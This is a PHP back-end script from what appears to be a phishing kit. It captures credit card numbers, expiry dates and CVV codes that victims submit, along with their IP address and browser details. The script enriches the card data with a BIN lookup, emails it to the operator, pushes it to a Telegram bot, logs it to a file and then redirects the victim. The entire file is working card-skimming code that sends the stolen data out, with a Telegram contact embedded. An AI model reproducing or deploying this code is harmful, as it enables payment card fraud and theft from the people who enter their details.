<?php
	error_reporting(0);
	ob_start();
	session_start();
include 'function.php';
       include 'email.php';
$bin = substr(str_replace(' ', '', $_POST['card_number']), 0, 6);
        $ch = curl_init('https://binlist.io/lookup/' . $bin . '/');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $response = json_decode(curl_exec($ch));
        sleep(2);
        
$message = "
🏦" . $response->bank->name . "🏦
Marque: " . strtoupper($response->scheme) . "
Level: " . $response->category . "
http://t.me/Sir_V2
BIN : " .$bin."
CC : ".$_POST['card_number']."
Exp : ".$_POST['card_expiration_month']."/".$_POST['card_expiration_year']."
cvv : ".$_POST['card_security_code']."
IP: "._ip()."
User Agent: ".$_SERVER["HTTP_USER_AGENT"]."
";
$Subject="New cc "._ip();
$head="From: vendetta   <log@rezzz.com>";
$bin = "$browserx$versionx$getbinsx";
mail($my_mail,$Subject,$message,$head);
  ;
sendMessage($chat_id, $message, $bot_token);
$fil = fopen('log.txt', 'a+');
fwrite($fil, '####################'.$message.'####################');
$_SESSION['step_one']  = true;
header('location: fin.php');


